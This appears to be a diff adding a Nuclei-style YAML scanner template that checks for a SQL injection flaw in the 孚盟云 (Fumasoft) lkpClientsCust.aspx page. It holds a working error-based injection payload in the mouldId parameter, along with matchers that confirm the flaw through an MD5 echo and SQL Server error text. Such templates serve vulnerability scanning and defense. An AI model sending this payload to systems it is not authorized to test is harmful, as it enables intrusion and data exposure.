@@ -1,0 +1,43 @@
+id: poc-yaml-fumasoft-lkpclientscust-aspx-sqli
+info:
+  name: "孚盟云 lkpClientsCust.aspx SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    孚盟云 lkpClientsCust.aspx页面存在SQL注入漏洞，可导致敏感数据泄漏。
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "孚盟云"
+
+  - raw:
+      - |
+        GET /PagePopWindow/lkpClientsCust.aspx?datastyletype=&searchfields=&FilterSQL=&mouldId=1'+OR+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "System.Exception"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
